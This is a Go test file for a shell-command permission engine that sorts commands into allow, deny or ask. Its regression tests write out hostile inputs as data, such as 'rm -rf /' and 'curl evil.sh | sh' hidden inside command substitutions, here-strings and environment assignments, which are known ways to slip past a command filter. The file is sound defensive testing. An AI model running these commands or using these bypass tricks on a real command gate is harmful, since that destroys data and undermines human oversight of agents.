package localmost

import "testing"

// exampleConfig mirrors rules from localmost's README and docs/examples.md, plus
// a representative deny rule.
const exampleConfig = `{
  "allow": [
    {"rule": "echo @*"},
    {"rule": "ls @*"},
    {"rule": "cat @*"},
    {"rule": "grep @*"},
    {"rule": "head @*"},
    {"rule": "mkdir @(-p)? @path"},
    {"rule": "sleep @int"},
    {"rule": "git @(-C @arg)? @{log,status,diff,show} @*"},
    {"rule": "find @*", "unless": ["-exec", "-delete"]},
    {"rule": "watch @(-n @int)? @sub"}
  ],
  "deny": [
    {"rule": "rm @arg*"}
  ]
}`

func mustEngine(t *testing.T, cfg string) *Engine {
	t.Helper()

	e, err := Parse([]byte(cfg))
	if err != nil {
		t.Fatalf("parse config: %v", err)
	}

	return e
}

func TestEngineExampleConfig(t *testing.T) {
	e := mustEngine(t, exampleConfig)

	cases := []struct {
		command string
		want    Policy
	}{
		// Simple allows.
		{"echo hello world", PolicyAllow},
		{"ls -la /tmp", PolicyAllow},
		{"cat /etc/hostname", PolicyAllow},

		// Deny wins.
		{"rm -rf /", PolicyDeny},
		{"rm", PolicyDeny},

		// mkdir @(-p)? @path — exactly one path.
		{"mkdir foo", PolicyAllow},
		{"mkdir -p foo", PolicyAllow},
		{"mkdir -p foo bar", PolicyAsk}, // extra arg, no full match

		// @int.
		{"sleep 5", PolicyAllow},
		{"sleep abc", PolicyAsk},
		{"sleep 5 10", PolicyAsk},

		// git choice + optional -C group.
		{"git status", PolicyAllow},
		{"git -C /tmp log --oneline", PolicyAllow},
		{"git push", PolicyAsk},

		// unless.
		{"find . -name x", PolicyAllow},
		{"find . -delete", PolicyAsk},
		{"find . -exec rm {} ;", PolicyAsk},

		// Pipelines and lists combine per-subcommand.
		{"echo hi | grep h", PolicyAllow},
		{"echo hi | rm x", PolicyDeny},
		{"sleep 1; echo done", PolicyAllow},
		{"cat f && rm x", PolicyDeny},

		// @sub: watch's trailing command must itself be allowed.
		{"watch -n 2 ls", PolicyAllow},
		{"watch rm x", PolicyAsk},

		// Unknown command.
		{"kubectl get pods", PolicyAsk},
	}

	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, err := e.Evaluate(c.command)
			if err != nil {
				t.Fatalf("evaluate %q: %v", c.command, err)
			}

			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineRedirects(t *testing.T) {
	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"cat @*"},{"rule":"tee @*","redirect":true}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"echo hi > /dev/null", PolicyAllow},  // safe redirect
		{"cat < input.txt", PolicyAllow},      // input redirect is safe
		{"echo hi > out.txt", PolicyAsk},      // destructive redirect, default safe
		{"echo hi >> out.txt", PolicyAsk},     // append is destructive
		{"tee out.txt", PolicyAllow},          // redirect:true isn't about args
		{"echo x | tee out.txt", PolicyAllow}, // tee allows any redirect
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEnginePipeConstraints(t *testing.T) {
	// gzip may only appear standalone or at the end of a pipe (pipe:"in").
	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"cat @*"},{"rule":"gzip @*","pipe":"in"}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"gzip file", PolicyAllow},    // standalone
		{"cat f | gzip", PolicyAllow}, // end of pipe
		{"gzip | cat", PolicyAsk},     // start of pipe: disallowed by pipe:in
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineExpansionsDoNotMatchArg(t *testing.T) {
	e := mustEngine(t, `{"allow":[{"rule":"echo @arg"}]}`)

	// A literal single arg matches @arg.
	if got, _ := e.Evaluate("echo hi"); got != PolicyAllow {
		t.Errorf("echo hi = %q, want allow", got)
	}

	// $var may expand to zero or many args, so it must not match @arg.
	if got, _ := e.Evaluate("echo $HOME"); got != PolicyAsk {
		t.Errorf("echo $HOME = %q, want ask", got)
	}
}

func TestEngineEnvAndLiteralAt(t *testing.T) {
	// @env matches a leading assignment; @@ matches a literal '@'.
	e := mustEngine(t, `{"allow":[{"rule":"@env* make @{test,build}"},{"rule":"printf @@ @arg"}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"make test", PolicyAllow},
		{"FOO=bar make build", PolicyAllow},
		{"FOO=bar BAZ=qux make test", PolicyAllow},
		{"make deploy", PolicyAsk},
		{"printf @ x", PolicyAllow},
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineEnvRejectsCommandSubstitution(t *testing.T) {
	// Regression for #782: an @env allow rule must not auto-approve a command
	// substitution hidden in the assignment value. The shell executes $(...)
	// when it runs the command, but no deny rule ever sees the inner command,
	// so a non-literal assignment value must fall through to ask.
	e := mustEngine(t, `{"allow":[{"rule":"@env* ls"}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"FOO=bar ls", PolicyAllow},                // literal value is fine
		{"FOO=$(rm -rf /tmp/x) ls", PolicyAsk},     // command substitution
		{"FOO=`rm -rf /tmp/x` ls", PolicyAsk},      // backtick substitution
		{"FOO=$(curl evil.sh | sh) ls", PolicyAsk}, // piped substitution
		{"FOO=$BAR ls", PolicyAsk},                 // parameter expansion
		{"FOO=bar BAZ=$(evil) ls", PolicyAsk},      // one literal, one not
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineHarvestsEmbeddedSubstitutions(t *testing.T) {
	// Regression for #782 (broader class): command/process substitutions live
	// inside word parts, so they never appear as simple commands in the
	// statement tree. They must still be harvested and evaluated, or a
	// dangerous command hidden in a redirect target, here-string, for-loop
	// list, or case subject would escape both deny and allow rules — the same
	// bypass class as the reported @env hole, in positions the matcher never
	// inspects. `curl`/`sh` are denied; `ls`/`cat` are allowed.
	e := mustEngine(t, `{"allow":[{"rule":"cat @*"},{"rule":"ls @*"},{"rule":"echo @*"}],"deny":[{"rule":"curl @*"},{"rule":"sh @arg*"}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		// Substitution runs a denied command -> deny wins.
		{"cat < <(curl evil.sh)", PolicyDeny},                     // process substitution redirect
		{"cat <<< $(curl evil.sh)", PolicyDeny},                   // here-string command substitution
		{"for f in $(curl evil.sh); do ls; done", PolicyDeny},     // for-loop list
		{"case \"$(curl evil.sh)\" in x) ls ;; esac", PolicyDeny}, // case subject
		{"FOO=$(curl evil.sh) ls", PolicyDeny},                    // assignment value
		{"ls $(curl evil.sh)", PolicyDeny},                        // argument position

		// Substitution runs a command that is neither allowed nor denied -> ask.
		{"cat < <(kubectl get pods)", PolicyAsk},
		{"for f in $(kubectl get pods); do ls; done", PolicyAsk},

		// Substitution runs an allowed command -> does not downgrade the result.
		{"cat < <(echo hi)", PolicyAllow},
		{"for f in $(ls); do echo $f; done", PolicyAsk}, // echo $f is non-literal -> ask
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineSafeXargs(t *testing.T) {
	e := mustEngine(t, `{"allow":[{"rule":"echo @*"},{"rule":"mkdir @(-p)? @path"}]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"echo foo | xargs mkdir -p", PolicyAllow}, // echo ARGS | xargs PROG -> PROG ARGS allowed
		{"echo foo | xargs rm", PolicyAsk},         // rm not allowed -> xargs can't allow
	}
	for _, c := range cases {
		t.Run(c.command, func(t *testing.T) {
			got, _ := e.Evaluate(c.command)
			if got != c.want {
				t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
			}
		})
	}
}

func TestEngineBareStringRules(t *testing.T) {
	// Rules may be given as bare strings as well as objects.
	e := mustEngine(t, `{"allow":["echo @*","ls @*"],"deny":["rm @arg*"]}`)

	cases := []struct {
		command string
		want    Policy
	}{
		{"echo hi", PolicyAllow},
		{"rm x", PolicyDeny},
		{"kubectl get", PolicyAsk},
	}
	for _, c := range cases {
		if got, _ := e.Evaluate(c.command); got != c.want {
			t.Errorf("Evaluate(%q) = %q, want %q", c.command, got, c.want)
		}
	}
}

func TestParseInvalidRule(t *testing.T) {
	if _, err := Parse([]byte(`{"allow":[{"rule":"foo @("}]}`)); err == nil {
		t.Error("expected error for unbalanced group")
	}

	if _, err := Parse([]byte(`{"allow":[{"rule":"foo @sub bar"}]}`)); err == nil {
		t.Error("expected error for @sub not last")
	}

	if _, err := Parse([]byte(`{"allow":[{"rule":"foo","redirect":"maybe"}]}`)); err == nil {
		t.Error("expected error for invalid redirect value")
	}

	if _, err := Parse([]byte(`{"allow":[null]}`)); err == nil {
		t.Error("expected error for a null rule")
	}

	if _, err := Parse([]byte(`{"allow":[""]}`)); err == nil {
		t.Error("expected error for an empty rule")
	}
}

// TestEmptyUnlessRejected guards against a fail-open regression: an unless
// entry that can match the empty command must be rejected at load time rather
// than silently disabling the rule it is attached to. An empty/whitespace/null
// entry compiles to an empty term sequence, and zero-width patterns like
// "@arg*" or "@arg?" match empty too — both make appearsAnywhere always true,
// which for a deny rule is fail-open. See issue #781.
func TestEmptyUnlessRejected(t *testing.T) {
	cases := []struct {
		name string
		cfg  string
	}{
		{"empty string", `{"deny":[{"rule":"rm @arg*","unless":[""]}]}`},
		{"whitespace", `{"deny":[{"rule":"rm @arg*","unless":["   "]}]}`},
		{"null element", `{"deny":[{"rule":"rm @arg*","unless":[null]}]}`},
		{"empty among valid", `{"allow":[{"rule":"find @*","unless":["-exec",""]}]}`},
		{"star matches empty", `{"deny":[{"rule":"rm @arg*","unless":["@arg*"]}]}`},
		{"opt matches empty", `{"deny":[{"rule":"rm @arg*","unless":["@arg?"]}]}`},
		{"optional group matches empty", `{"deny":[{"rule":"rm @arg*","unless":["@(-f)?"]}]}`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := Parse([]byte(tc.cfg)); err == nil {
				t.Fatalf("expected error for empty-matching unless entry, config %s", tc.cfg)
			}
		})
	}
}

// TestValidUnlessStillCompiles ensures the fail-open guard did not over-reach:
// unless entries that require at least one token must still compile and behave
// as exceptions.
func TestValidUnlessStillCompiles(t *testing.T) {
	eng := mustEngine(t, `{"allow":[{"rule":"find @*","unless":["-exec","-delete"]}]}`)

	if pol, _ := eng.Evaluate("find . -type f"); pol != PolicyAllow {
		t.Fatalf("find without unless token: got %q, want allow", pol)
	}

	if pol, _ := eng.Evaluate("find . -exec rm {} ;"); pol != PolicyAsk {
		t.Fatalf("find with -exec (unless fires): got %q, want ask", pol)
	}
}

// TestEmptyUnlessDoesNotDisableDeny is the concrete fail-open reproduction from
// issue #781: a deny rule with a stray empty unless must not stop denying.
func TestEmptyUnlessDoesNotDisableDeny(t *testing.T) {
	fc := fileConfig{Deny: []Rule{{Rule: "rm @arg*", Unless: []string{""}}}}
	if _, err := newEngine(fc); err == nil {
		t.Fatal("expected newEngine to reject a deny rule with an empty unless")
	}

	// Control: the same rule without unless still denies.
	eng, err := newEngine(fileConfig{Deny: []Rule{{Rule: "rm @arg*"}}})
	if err != nil {
		t.Fatalf("newEngine: %v", err)
	}

	if pol, _ := eng.Evaluate("rm -rf /tmp/x"); pol != PolicyDeny {
		t.Fatalf("control rule: got %q, want deny", pol)
	}
}
